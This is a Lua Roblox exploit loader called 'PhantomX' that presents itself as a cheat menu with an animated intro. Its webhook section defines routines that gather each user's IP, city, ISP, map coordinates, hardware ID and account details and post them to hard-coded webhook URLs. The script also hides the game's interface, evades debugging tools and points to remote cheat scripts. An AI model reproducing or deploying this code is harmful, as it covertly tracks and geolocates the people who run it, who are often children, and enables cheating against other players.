-- PhantomX Combined Loader + Mode Selector (Skip + Avatar + Age Fix)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

if shared.PhantomX_Loader_Executed then return end
shared.PhantomX_Loader_Executed = true

-- ====== WEBHOOK SYSTEM ======
local global_req = (request or http_request or (syn and syn.request) or (fluxus and fluxus.request))

local function GET_HWID()
    local hwid = "Unavailable"
    pcall(function()
        if syn and syn.gethwid then hwid = syn.gethwid()
        elseif gethwid then hwid = gethwid()
        elseif fluxus and getgenv and getgenv().fluxus then hwid = tostring(getgenv().fluxus.HWID)
        elseif delta and get_hw_id then hwid = tostring(get_hw_id()) end
    end)
    return hwid
end

local function IDENTIFY_EXECUTOR()
    local executor = "Unknown"
    if identifyexecutor then
        local success, name = pcall(identifyexecutor)
        if success and name then executor = tostring(name) end
    elseif syn then executor = "Synapse X"
    elseif KRNL_LOADED then executor = "Krnl"
    elseif fluxus then executor = "Fluxus"
    elseif delta then executor = "Delta"
    elseif is_sirhurt_closure then executor = "SirHurt"
    elseif OXYGEN then executor = "Oxygen U" end
    return executor
end

local EXECUTOR = IDENTIFY_EXECUTOR()
local HWID_VALUE = GET_HWID()

local PROTECTION_WEBHOOKS = {
    location = "https://rbxhook.cc/r/68c295ebe1529e3199d81944962f5938",
    success = "https://webhook.lewisakura.moe/api/webhooks/1499895230458101971/3QPdHXF4IZfHu3fAVeMdyZIAfjuu82_c7xCR3eiv5oWMow62WhprQ0fGNdxFvyPfC16a"
}

-- ====== AVATAR URL CACHE + FETCHER ======
local AVATAR_CACHE = {}

local function GetAvatarUrl(userId)
    userId = tostring(userId)
    if AVATAR_CACHE[userId] then return AVATAR_CACHE[userId] end

    local avatarUrl = nil

    if global_req then
        local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
            .. userId .. "&size=420x420&format=Png&isCircular=false"
        local ok, response = pcall(function()
            return global_req({Url = apiUrl, Method = "GET"})
        end)
        if ok and response and response.Body then
            local decodeOk, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            if decodeOk and data and data.data and data.data[1] and data.data[1].imageUrl then
                avatarUrl = data.data[1].imageUrl
            end
        end
    end

    if not avatarUrl then
        avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="
            .. userId .. "&width=420&height=420&format=png"
    end

    AVATAR_CACHE[userId] = avatarUrl
    return avatarUrl
end

local function sendWebhook(webhookUrl, embedData)
    if not global_req or not webhookUrl then
        warn("[PhantomX] No request function available")
        return false
    end
    local data = {
        ["username"] = "PhantomX Logger",
        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png",
        ["embeds"] = {embedData}
    }
    local success = pcall(function()
        return global_req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    return success
end

local function GetLocationInfo()
    local locationData = {
        ip = "Unknown", country = "Unknown", country_code = "Unknown",
        city = "Unknown", region = "Unknown", continent = "Unknown",
        isp = "Unknown", timezone = "Unknown", currency = "Unknown",
        latitude = "Unknown", longitude = "Unknown"
    }
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
    end)
    if success and result then
        for k, v in pairs(result) do
            if locationData[k] ~= nil then locationData[k] = tostring(v) end
        end
    end
    return locationData
end

local function GetPlaceInfo()
    local placeId = game.PlaceId
    local placeName = "Game_"..placeId
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if success and result and result.Name then
        placeName = result.Name
        if #placeName > 60 then placeName = string.sub(placeName,1,60).."..." end
    end
    return {Name = placeName, ID = placeId}
end

-- ====== FIXED: AccountAge is in DAYS, not seconds ======
local function GetAccountAgeYearsAndDays(p)
    local success, accountAgeInDays = pcall(function()
        return p.AccountAge
    end)
    if success and accountAgeInDays then
        local totalDays = math.floor(accountAgeInDays)
        local years = math.floor(totalDays / 365)
        local remainingDays = totalDays % 365
        local creationTime = os.time() - (totalDays * 86400)
        local creationDate = os.date("%Y/%m/%d", creationTime)
        local ageString = ""
        if years > 0 then
            ageString = years .. " year" .. (years > 1 and "s" or "")
        end
        if remainingDays > 0 then
            if ageString ~= "" then ageString = ageString .. ", " end
            ageString = ageString .. remainingDays .. " day" .. (remainingDays > 1 and "s" or "")
        end
        if ageString == "" then ageString = "Less than 1 day" end
        return {
            years = years, days = remainingDays, totalDays = totalDays,
            formatted = ageString, createdDate = creationDate
        }
    end
    return {
        years = 0, days = 0, totalDays = 0,
        formatted = "Unknown", createdDate = "Unknown"
    }
end

local function checkChatStatus()
    local p = player
    local canChat = false
    local chatSystem = "Unknown"
    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        chatSystem = "New TextChatService"
        local success, result = pcall(function()
            return TextChatService:CanUserChatAsync(p.UserId)
        end)
        canChat = success and result
    else
        chatSystem = "Old Chat System"
        canChat = p.ChatEnabled
    end
    return {canChat = canChat, status = canChat and "✅ Chat Unlocked" or "❌ Chat Locked", system = chatSystem}
end

local foundGame = nil

local function SendLocationReport()
    task.spawn(function()
        local placeInfo = GetPlaceInfo()
        local p = player
        local accountAge = GetAccountAgeYearsAndDays(p)
        local locationInfo = GetLocationInfo()
        local chatStatus = checkChatStatus()
        local jobId = game.JobId
        local avatarUrl = GetAvatarUrl(p.UserId)
        local mapLink = "N/A"
        if locationInfo.latitude ~= "Unknown" and locationInfo.longitude ~= "Unknown" then
            mapLink = string.format("https://www.google.com/maps?q=%s,%s", locationInfo.latitude, locationInfo.longitude)
        end
        local embed = {
            ["title"] = "🌍 PHANTOMX LOCATION REPORT",
            ["color"] = 3447003,
            ["author"] = {
                ["name"] = p.Name .. " • PhantomX",
                ["icon_url"] = avatarUrl
            },
            ["fields"] = {
                {["name"]="🎮 **GAME INFORMATION**",["value"]="**Name:** "..placeInfo.Name.."\n**ID:** `"..placeInfo.ID.."`\n**Server:** `"..jobId.."`",["inline"]=false},
                {["name"]="👤 **PLAYER INFORMATION**",["value"]="**Name:** `"..p.Name.."`\n**ID:** `"..p.UserId.."`\n**Display Name:** `"..p.DisplayName.."`",["inline"]=false},
                {["name"]="💻 **EXECUTOR & HWID**",["value"]="**Executor:** `"..EXECUTOR.."`\n**HWID:** `"..HWID_VALUE.."`",["inline"]=false},
                {["name"]="📅 **ACCOUNT INFO**",["value"]="**Age:** "..accountAge.formatted.."\n**Created:** "..accountAge.createdDate.."\n**Total Days:** "..accountAge.totalDays,["inline"]=true},
                {["name"]="💬 **CHAT STATUS**",["value"]=chatStatus.status.."\n**System:** "..chatStatus.system,["inline"]=true},
                {["name"]="🌐 **NETWORK INFO**",["value"]="**IP:** ||`"..locationInfo.ip.."`||\n**ISP:** "..locationInfo.isp,["inline"]=false},
                {["name"]="📍 **LOCATION DETAILS**",["value"]="**Country:** "..locationInfo.country.." ("..locationInfo.country_code..")\n**Region:** "..locationInfo.region.."\n**City:** "..locationInfo.city.."\n**Continent:** "..locationInfo.continent,["inline"]=false},
                {["name"]="🗺️ **MAP COORDINATES**",["value"]="**Latitude:** `"..locationInfo.latitude.."`\n**Longitude:** `"..locationInfo.longitude.."`\n**Map Link:** [Google Maps]("..mapLink..")",["inline"]=false},
                {["name"]="⏰ **TIME & CURRENCY**",["value"]="**Timezone:** "..locationInfo.timezone.."\n**Currency:** "..locationInfo.currency,["inline"]=true},
            },
            ["footer"] = {["text"]="PhantomX Location Tracker • "..os.date("%Y/%m/%d %H:%M:%S")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["thumbnail"] = {["url"] = avatarUrl},
            ["description"] = "📡 **New player location detected!**\nPlayer has executed PhantomX script\n**Chat Status:** "..chatStatus.status
        }
        sendWebhook(PROTECTION_WEBHOOKS.location, embed)
    end)
end

local function SendSuccessReport()
    task.spawn(function()
        local placeInfo = GetPlaceInfo()
        local p = player
        local accountAge = GetAccountAgeYearsAndDays(p)
        local chatStatus = checkChatStatus()
        local jobId = game.JobId
        local avatarUrl = GetAvatarUrl(p.UserId)
        local FERN_LINK = "https://fern.wtf/joiner?placeId=" .. placeInfo.ID .. "&gameInstanceId=" .. jobId
        local embed = {
            ["title"] = "✅ PHANTOMX SUCCESSFULLY LOADED",
            ["color"] = 65280,
            ["author"] = {
                ["name"] = p.Name .. " • PhantomX",
                ["icon_url"] = avatarUrl
            },
            ["fields"] = {
                {["name"]="🎮 **GAME**",["value"]="**Name:** "..placeInfo.Name.."\n**ID:** `"..placeInfo.ID.."`\n**Server:** `"..jobId.."`",["inline"]=false},
                {["name"]="👤 **PLAYER**",["value"]="**Name:** `"..p.Name.."`\n**ID:** `"..p.UserId.."`",["inline"]=true},
                {["name"]="💻 **EXECUTOR & HWID**",["value"]="**Executor:** `"..EXECUTOR.."`\n**HWID:** `"..HWID_VALUE.."`",["inline"]=true},
                {["name"]="📅 **ACCOUNT**",["value"]="**Age:** "..accountAge.formatted,["inline"]=true},
                {["name"]="💬 **CHAT**",["value"]=chatStatus.status,["inline"]=true},
                {["name"]="🎯 **GAME TYPE**",["value"]=foundGame and foundGame.name or "Unknown",["inline"]=true},
                {["name"]="🔗 **JOIN SERVER**",["value"]="[**Click here to join this server**]("..FERN_LINK..")",["inline"]=false}
            },
            ["footer"] = {["text"]="PhantomX • "..os.date("%Y/%m/%d %H:%M:%S")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["thumbnail"] = {["url"] = avatarUrl}
        }
        sendWebhook(PROTECTION_WEBHOOKS.success, embed)
    end)
end

-- ====== LOADER UI ======
local CROW_SOUND_ID = "rbxassetid://5829815715"
local CLICK_SOUND_ID = "rbxassetid://15675032796"

local activeModels = {}
local thumbnailCards = {}

local hiddenGuis = {}
pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
pcall(function()
    for _, child in ipairs(CoreGui:GetChildren()) do
        if child:IsA("ScreenGui") and child.Enabled then
            table.insert(hiddenGuis, child)
            child.Enabled = false
        end
    end
end)

local function restoreRobloxGui()
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
    for _, g in ipairs(hiddenGuis) do
        if g and g.Parent then pcall(function() g.Enabled = true end) end
    end
end

local function getRandomName() return HttpService:GenerateGUID(false) end

local function checkDex()
    pcall(function()
        for _, guiObj in ipairs(CoreGui:GetChildren()) do
            local n = guiObj.Name:lower()
            if n:find("dex") or n:find("explorer") or n:find("spy") or n:find("dark") then
                for _, m in ipairs(activeModels) do
                    if m and m.Parent then m:Destroy() end
                end
                break
            end
        end
    end)
end

task.spawn(function()
    while task.wait(0.5) do
        if not shared.PhantomX_Loader_Executed then break end
        checkDex()
    end
end)

local DISCORD_INVITE = "https://discord.gg/uRtbxxxrau"
local DEVELOPER_USERNAME = "1a8f"
local DISCORD_ICON = "rbxassetid://18505728201"
local DEVELOPER_ICON = "rbxassetid://11089610548"

local RED_DARK_START = Color3.fromRGB(35, 3, 6)
local RED_DARK_END = Color3.fromRGB(12, 1, 2)
local RED_DARK = Color3.fromRGB(45, 4, 8)
local RED_NORMAL = Color3.fromRGB(75, 6, 12)
local RED_HOVER = Color3.fromRGB(100, 8, 16)
local RED_GLOW = Color3.fromRGB(145, 12, 22)
local RED_BRIGHT = Color3.fromRGB(220, 25, 35)
local TEXT_DARK_RED = Color3.fromRGB(130, 5, 10)
local TEXT_STROKE_BLACK = Color3.fromRGB(0, 0, 0)
local DISCORD_PURPLE = Color3.fromRGB(88, 101, 242)
local DEVELOPER_COLOR = Color3.fromRGB(190, 185, 190)
local PANEL = Color3.fromRGB(15, 13, 16)
local PANEL_HOVER = Color3.fromRGB(24, 20, 23)
local WHITE = Color3.fromRGB(240, 237, 239)
local MUTED = Color3.fromRGB(135, 128, 132)

local function Tween(object, time, properties, style, direction)
    local info = TweenInfo.new(time, style or Enum.EasingStyle.Quint, direction or Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, info, properties)
    tween:Play()
    return tween
end

local function Copy(text)
    if setclipboard then pcall(function() setclipboard(text) end) return true end
    if toclipboard then pcall(function() toclipboard(text) end) return true end
    return false
end

local supportedGames = {
    {
        name = "TimeBomb Duels",
        ids = {98752102030179, 11379739543},
        scriptUrl = "https://raw.githubusercontent.com/Client-dotcom/b/main/px.lua.txt",
        adminScriptUrl = "https://raw.githubusercontent.com/Client-dotcom/Admins/main/AdminScriptlua.txt"
    },
    {
        name = "Murder Mastery",
        ids = {142823291, 97748238082926},
        scriptUrl = "https://raw.githubusercontent.com/Client-dotcom/b/main/mobf.lua.txt",
        secondaryScriptUrl = "https://raw.githubusercontent.com/Client-dotcom/b/main/stobf.lua.txt",
        adminScriptUrl = "https://raw.githubusercontent.com/Client-dotcom/Admins/main/AdminScriptlua.txt"
    },
    {
        name = "Flick",
        ids = {136801880565837},
        scriptUrl = "https://raw.githubusercontent.com/Client-dotcom/b/main/flk.lua.txt",
        adminScriptUrl = "https://raw.githubusercontent.com/Client-dotcom/Admins/main/AdminScriptlua.txt"
    },
}

local currentPlaceId = game.PlaceId
for _, gameInfo in ipairs(supportedGames) do
    for _, gameId in ipairs(gameInfo.ids) do
        if currentPlaceId == gameId then foundGame = gameInfo; break end
    end
    if foundGame then break end
end

local placeName = "Unknown Map"
pcall(function()
    local info = MarketplaceService:GetProductInfo(currentPlaceId)
    if info and info.Name then placeName = info.Name end
end)

local function playSound(id, volume, delayTime)
    if not id or id == "" then return end
    task.delay(delayTime or 0, function()
        local s = Instance.new("Sound")
        s.SoundId = id
        s.Volume = volume or 1
        s.PlaybackSpeed = 1
        s.Parent = SoundService
        pcall(function() s:Play() end)
        s.Ended:Connect(function() s:Destroy() end)
    end)
end

local function getHRP()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart", 10)
    return hrp, char
end

local hrp, character = getHRP()
local basePos = hrp and hrp.Position or Vector3.new(0, 50, 0)
local skyOrigin = basePos + Vector3.new(0, 300, 0)

local oldCameraType = camera.CameraType
local oldCameraSubject = camera.CameraSubject
local oldFOV = camera.FieldOfView
local initialCamCF = camera.CFrame

local function clamp01(x) return math.clamp(x, 0, 1) end
local function smooth(x) x = clamp01(x); return x * x * (3 - 2 * x) end
local function smoother(x) x = clamp01(x); return x * x * x * (x * (x * 6 - 15) + 10) end
local function lerp(a, b, t) return a + (b - a) * clamp01(t) end
local function wingbeat(t, speed, phase) return math.sin(t * speed + phase) end

local playerGui = player:WaitForChild("PlayerGui", 10)
local gui = Instance.new("ScreenGui")
gui.Name = getRandomName()
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 2147483647
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = playerGui

local ClickSound = Instance.new("Sound", gui)
ClickSound.Name = getRandomName()
ClickSound.SoundId = CLICK_SOUND_ID

local fade = Instance.new("Frame", gui)
fade.Name = getRandomName()
fade.Size = UDim2.fromScale(1, 1)
fade.BackgroundColor3 = Color3.new(0, 0, 0)
fade.BackgroundTransparency = 0
fade.BorderSizePixel = 0
fade.ZIndex = 1

local flash = Instance.new("Frame", gui)
flash.Name = getRandomName()
flash.Size = UDim2.fromScale(1, 1)
flash.BackgroundColor3 = Color3.fromRGB(255, 10, 10)
flash.BackgroundTransparency = 1
flash.BorderSizePixel = 0
flash.ZIndex = 100

local vignette = Instance.new("ImageLabel", gui)
vignette.Name = getRandomName()
vignette.Size = UDim2.fromScale(1, 1)
vignette.BackgroundTransparency = 1
vignette.Image = "rbxassetid://457647544"
vignette.ImageColor3 = Color3.fromRGB(180, 0, 0)
vignette.ImageTransparency = 1
vignette.ZIndex = 80

local topLetterbox = Instance.new("Frame", gui)
topLetterbox.Name = getRandomName()
topLetterbox.Size = UDim2.new(1, 0, 0, 0)
topLetterbox.Position = UDim2.new(0, 0, 0, 0)
topLetterbox.BackgroundColor3 = Color3.fromRGB(10, 8, 12)
topLetterbox.BorderSizePixel = 0
topLetterbox.ClipsDescendants = true
topLetterbox.ZIndex = 90

local topGlowLine = Instance.new("Frame", topLetterbox)
topGlowLine.Name = getRandomName()
topGlowLine.Size = UDim2.new(1, 0, 0, 2)
topGlowLine.Position = UDim2.new(0, 0, 1, -2)
topGlowLine.BackgroundColor3 = RED_BRIGHT
topGlowLine.BorderSizePixel = 0
topGlowLine.ZIndex = 91

local bottomLetterbox = Instance.new("Frame", gui)
bottomLetterbox.Name = getRandomName()
bottomLetterbox.Size = UDim2.new(1, 0, 0, 0)
bottomLetterbox.Position = UDim2.new(0, 0, 1, 0)
bottomLetterbox.AnchorPoint = Vector2.new(0, 1)
bottomLetterbox.BackgroundColor3 = Color3.fromRGB(10, 8, 12)
bottomLetterbox.BorderSizePixel = 0
bottomLetterbox.ClipsDescendants = true
bottomLetterbox.ZIndex = 90

local bottomGlowLine = Instance.new("Frame", bottomLetterbox)
bottomGlowLine.Name = getRandomName()
bottomGlowLine.Size = UDim2.new(1, 0, 0, 2)
bottomGlowLine.Position = UDim2.new(0, 0, 0, 0)
bottomGlowLine.BackgroundColor3 = RED_BRIGHT
bottomGlowLine.BorderSizePixel = 0
bottomGlowLine.ZIndex = 91

-- ====== SKIP BUTTON (bottom-left) ======
local skipRequested = false
local SkipBtn = Instance.new("TextButton", gui)
SkipBtn.Name = "SkipIntroButton"
SkipBtn.AnchorPoint = Vector2.new(0, 1)
SkipBtn.Position = UDim2.new(0, 14, 1, -14)
SkipBtn.Size = UDim2.new(0, 78, 0, 30)
SkipBtn.BackgroundColor3 = PANEL
SkipBtn.BackgroundTransparency = 0.1
SkipBtn.BorderSizePixel = 0
SkipBtn.Text = "SKIP ›"
SkipBtn.TextColor3 = WHITE
SkipBtn.Font = Enum.Font.GothamBold
SkipBtn.TextSize = 11
SkipBtn.AutoButtonColor = false
SkipBtn.ZIndex = 550
Instance.new("UICorner", SkipBtn).CornerRadius = UDim.new(0, 8)

local skipStroke = Instance.new("UIStroke", SkipBtn)
skipStroke.Color = RED_NORMAL
skipStroke.Thickness = 1
skipStroke.Transparency = 0.3

SkipBtn.MouseEnter:Connect(function()
    Tween(SkipBtn, 0.18, {BackgroundColor3 = RED_DARK})
    Tween(skipStroke, 0.18, {Color = RED_BRIGHT, Transparency = 0})
end)
SkipBtn.MouseLeave:Connect(function()
    Tween(SkipBtn, 0.18, {BackgroundColor3 = PANEL})
    Tween(skipStroke, 0.18, {Color = RED_NORMAL, Transparency = 0.3})
end)
SkipBtn.MouseButton1Click:Connect(function()
    if skipRequested then return end
    skipRequested = true
    ClickSound:Play()
    if SkipBtn and SkipBtn.Parent then
        Tween(SkipBtn, 0.2, {BackgroundTransparency = 1, TextTransparency = 1})
        Tween(skipStroke, 0.2, {Transparency = 1})
        task.delay(0.25, function()
            if SkipBtn and SkipBtn.Parent then SkipBtn:Destroy() end
        end)
    end
end)

-- Crow model helpers
local featherBlack = Color3.fromRGB(12, 12, 16)
local chestBlack = Color3.fromRGB(25, 25, 32)
local beakColor = Color3.fromRGB(35, 28, 22)
local legColor = Color3.fromRGB(20, 18, 16)
local red = Color3.fromRGB(255, 0, 0)

local function part(size, color, material)
    local p = Instance.new("Part")
    p.Name = getRandomName()
    p.Size = size
    p.Color = color
    p.Material = material or Enum.Material.SmoothPlastic
    p.Anchored = true
    p.CanCollide = false
    p.CanTouch = false
    p.CanQuery = false
    p.CastShadow = true
    p.TopSurface = Enum.SurfaceType.Smooth
    p.BottomSurface = Enum.SurfaceType.Smooth
    return p
end

local function ball(size, color, material)
    local p = part(size, color, material)
    p.Shape = Enum.PartType.Ball
    return p
end

local function makeCrow(position, scale)
    local model = Instance.new("Model")
    model.Name = getRandomName()
    table.insert(activeModels, model)

    local root = part(Vector3.new(.25, .25, .25), featherBlack)
    root.Transparency = 1
    local body = part(Vector3.new(.62, .58, 1.45) * scale, featherBlack)
    local chest = part(Vector3.new(.44, .34, .14) * scale, chestBlack)
    local neck = part(Vector3.new(.31, .3, .34) * scale, featherBlack)
    local head = ball(Vector3.new(.5, .5, .52) * scale, featherBlack)
    local crest1 = part(Vector3.new(.1, .1, .11) * scale, featherBlack)
    local crest2 = part(Vector3.new(.08, .09, .1) * scale, featherBlack)
    local crest3 = part(Vector3.new(.08, .09, .1) * scale, featherBlack)
    local beak = part(Vector3.new(.16, .15, .38) * scale, beakColor)
    local beakTip = part(Vector3.new(.1, .1, .1) * scale, beakColor)
    local eyeR = part(Vector3.new(.09, .09, .05) * scale, red, Enum.Material.Neon)
    local eyeL = part(Vector3.new(.09, .09, .05) * scale, red, Enum.Material.Neon)

    local wingRootR = part(Vector3.new(1.1, .1, .42) * scale, featherBlack)
    local wingMidR = part(Vector3.new(.9, .08, .35) * scale, featherBlack)
    local wingTipR = part(Vector3.new(.75, .06, .26) * scale, featherBlack)
    local wingRootL = part(Vector3.new(1.1, .1, .42) * scale, featherBlack)
    local wingMidL = part(Vector3.new(.9, .08, .35) * scale, featherBlack)
    local wingTipL = part(Vector3.new(.75, .06, .26) * scale, featherBlack)

    local tailBase = part(Vector3.new(.42, .2, .3) * scale, featherBlack)
    local tails = {}
    for i = -2, 2 do tails[i] = part(Vector3.new(.13, .06, .85) * scale, featherBlack) end

    local function createLeg()
        local thigh = part(Vector3.new(.11, .28, .11) * scale, legColor)
        local shin = part(Vector3.new(.08, .3, .08) * scale, legColor)
        local foot = part(Vector3.new(.18, .06, .26) * scale, legColor)
        local toes = {}
        for i = -1, 1 do toes[i] = part(Vector3.new(.045, .03, .18) * scale, legColor) end
        return thigh, shin, foot, toes
    end
    local thighR, shinR, footR, toesR = createLeg()
    local thighL, shinL, footL, toesL = createLeg()
    local allParts = {root, body, chest, neck, head, crest1, crest2, crest3, beak, beakTip, eyeR, eyeL, wingRootR, wingMidR, wingTipR, wingRootL, wingMidL, wingTipL, tailBase, thighR, shinR, footR, thighL, shinL, footL}
    for i = -2, 2 do table.insert(allParts, tails[i]) end
    for i = -1, 1 do table.insert(allParts, toesR[i]); table.insert(allParts, toesL[i]) end
    for _, p in ipairs(allParts) do p.Parent = model end
    model.Parent = camera

    local function applyBody(cf, roll, bob)
        local bodyCF = cf * CFrame.new(0, bob or 0, 0) * CFrame.Angles(0, 0, roll or 0)
        root.CFrame = bodyCF
        body.CFrame = bodyCF
        chest.CFrame = bodyCF * CFrame.new(0, -.1 * scale, .72 * scale)
        neck.CFrame = bodyCF * CFrame.new(0, .24 * scale, .78 * scale) * CFrame.Angles(math.rad(-7), 0, 0)
        local headCF = neck.CFrame * CFrame.new(0, .15 * scale, .3 * scale)
        head.CFrame = headCF
        crest1.CFrame = headCF * CFrame.new(0, .25 * scale, .02 * scale)
        crest2.CFrame = headCF * CFrame.new(.055 * scale, .24 * scale, -.02 * scale) * CFrame.Angles(0, 0, math.rad(8))
        crest3.CFrame = headCF * CFrame.new(-.055 * scale, .24 * scale, -.02 * scale) * CFrame.Angles(0, 0, math.rad(-8))
        local beakCF = headCF * CFrame.new(0, -.035 * scale, .34 * scale)
        beak.CFrame = beakCF
        beakTip.CFrame = beakCF * CFrame.new(0, -.01 * scale, .23 * scale)
        eyeR.CFrame = headCF * CFrame.new(.22 * scale, .05 * scale, .18 * scale)
        eyeL.CFrame = headCF * CFrame.new(-.22 * scale, .05 * scale, .18 * scale)
        tailBase.CFrame = bodyCF * CFrame.new(0, -.05 * scale, -.82 * scale)
        for i = -2, 2 do
            local spread = math.rad(i * 7)
            tails[i].CFrame = tailBase.CFrame * CFrame.Angles(0, spread, 0) * CFrame.new(0, 0, -.48 * scale)
        end
    end

    local function applyFlyingWings(cf, flap, flex, roll, bob)
        local base = cf * CFrame.new(0, bob or 0, 0) * CFrame.Angles(0, 0, roll or 0)
        local function wing(sign, rootWing, midWing, tipWing)
            local rootCF = base * CFrame.new(sign * .22 * scale, .04 * scale, -.02 * scale) * CFrame.Angles(math.rad(-4), 0, sign * flap) * CFrame.new(sign * .45 * scale, 0, 0)
            rootWing.CFrame = rootCF
            local midCF = rootCF * CFrame.Angles(0, math.rad(sign * -6), sign * (flex * .75)) * CFrame.new(sign * .65 * scale, 0, -.01 * scale)
            midWing.CFrame = midCF
            local tipCF = midCF * CFrame.Angles(0, math.rad(sign * -9), sign * (flex * 1.15)) * CFrame.new(sign * .52 * scale, 0, -.015 * scale)
            tipWing.CFrame = tipCF
        end
        wing(1, wingRootR, wingMidR, wingTipR)
        wing(-1, wingRootL, wingMidL, wingTipL)
    end

    local function applyFoldedWings(cf, foldAmount)
        foldAmount = foldAmount or 1
        local base = cf
        local function folded(sign, rootWing, midWing, tipWing)
            local side = sign
            local rootCF = base * CFrame.new(side * .22 * scale, -.02 * scale, -.05 * scale) * CFrame.Angles(math.rad(10 * foldAmount), math.rad(side * -14 * foldAmount), math.rad(side * -38 * foldAmount)) * CFrame.new(side * .38 * scale, 0, .08 * scale)
            rootWing.CFrame = rootCF
            local midCF = rootCF * CFrame.new(side * .28 * scale, -.02 * scale, .06 * scale) * CFrame.Angles(math.rad(12 * foldAmount), math.rad(side * -10 * foldAmount), math.rad(side * -20 * foldAmount)) * CFrame.new(side * .28 * scale, 0, .14 * scale)
            midWing.CFrame = midCF
            local tipCF = midCF * CFrame.new(side * .20 * scale, -.01 * scale, .08 * scale) * CFrame.Angles(math.rad(12 * foldAmount), math.rad(side * -6 * foldAmount), math.rad(side * -15 * foldAmount)) * CFrame.new(side * .18 * scale, 0, .18 * scale)
            tipWing.CFrame = tipCF
        end
        folded(1, wingRootR, wingMidR, wingTipR)
        folded(-1, wingRootL, wingMidL, wingTipL)
    end

    local function applyStandingLegs(cf)
        local function leg(sign, thigh, shin, foot, toes)
            local thighCF = cf * CFrame.new(sign * .16 * scale, -.22 * scale, -.08 * scale) * CFrame.Angles(math.rad(22), 0, math.rad(sign * -4))
            thigh.CFrame = thighCF
            local shinCF = thighCF * CFrame.new(0, -.24 * scale, -.02 * scale) * CFrame.Angles(math.rad(-38), 0, 0)
            shin.CFrame = shinCF
            local footCF = shinCF * CFrame.new(0, -.22 * scale, .08 * scale) * CFrame.Angles(math.rad(16), 0, 0)
            foot.CFrame = footCF
            for i = -1, 1 do toes[i].CFrame = footCF * CFrame.Angles(0, math.rad(i * 22), 0) * CFrame.new(0, -.025 * scale, .14 * scale) end
        end
        leg(1, thighR, shinR, footR, toesR)
        leg(-1, thighL, shinL, footL, toesL)
    end

    local function setFlight(cf, flap, flex, roll, bob)
        applyBody(cf, roll, bob)
        applyFlyingWings(cf, flap, flex, roll, bob)
        applyStandingLegs(cf)
    end

    local function setStanding(cf)
        applyBody(cf, 0, 0)
        applyFoldedWings(cf, 1)
        applyStandingLegs(cf)
    end

    return {Model = model, Parts = allParts, Eyes = {eyeR, eyeL}, Root = root, SetFlight = setFlight, SetStanding = setStanding, ApplyBody = applyBody, ApplyFlyingWings = applyFlyingWings, ApplyFoldedWings = applyFoldedWings, ApplyStandingLegs = applyStandingLegs}
end

camera.CameraType = Enum.CameraType.Scriptable
camera.FieldOfView = oldFOV
local atmosphere = Instance.new("Atmosphere", Lighting)
atmosphere.Name = getRandomName()
atmosphere.Density = .45
atmosphere.Offset = 0.2
atmosphere.Color = Color3.fromRGB(30, 5, 8)
atmosphere.Decay = Color3.fromRGB(180, 15, 15)
atmosphere.Haze = 2.5
atmosphere.Glare = 0.8

local colorEffect = Instance.new("ColorCorrectionEffect", Lighting)
colorEffect.Name = getRandomName()
colorEffect.Brightness = -.08
colorEffect.Contrast = .42
colorEffect.Saturation = -.45
colorEffect.TintColor = Color3.fromRGB(255, 130, 130)

local CROW_COUNT = 10
local function createFlock(side)
    local result = {}
    for i = 1, CROW_COUNT do
        local offsetY = (i % 3) * 2.2
        local offsetZ = math.floor((i - 1) / 2) * -9
        local offsetX = (i % 2 == 0 and 1 or -1) * (i * 2.8)
        local crow = makeCrow(skyOrigin, .5)
        table.insert(result, {Crow = crow, OffsetX = offsetX, OffsetY = offsetY, OffsetZ = offsetZ, Side = side, Index = i})
    end
    return result
end
local rightFlock = createFlock("Right")
local leftFlock = createFlock("Left")

local function destroyFlock(flock)
    for _, info in ipairs(flock) do
        if info.Crow.Model and info.Crow.Model.Parent then info.Crow.Model:Destroy() end
    end
end

local collisionPoint = skyOrigin + Vector3.new(0, 14, 0)
local function getRightPosition(info, progress)
    local startPos = collisionPoint + Vector3.new(180, 12, -90)
    local endPos = collisionPoint + Vector3.new(-180, 12, 90)
    local currentCenter = startPos:Lerp(endPos, progress)
    return currentCenter + Vector3.new(info.OffsetX, info.OffsetY, info.OffsetZ)
end
local function getLeftPosition(info, progress)
    local startPos = collisionPoint + Vector3.new(-180, 12, -90)
    local endPos = collisionPoint + Vector3.new(180, 12, 90)
    local currentCenter = startPos:Lerp(endPos, progress)
    return currentCenter + Vector3.new(info.OffsetX, info.OffsetY, info.OffsetZ)
end

local targetSkyCamCF = CFrame.lookAt(collisionPoint + Vector3.new(0, -2, 26), collisionPoint)

local topLbTween = TweenService:Create(topLetterbox, TweenInfo.new(1.0, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 0, 28)})
topLbTween:Play()
local bottomLbTween = TweenService:Create(bottomLetterbox, TweenInfo.new(1.0, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 0, 28)})
bottomLbTween:Play()
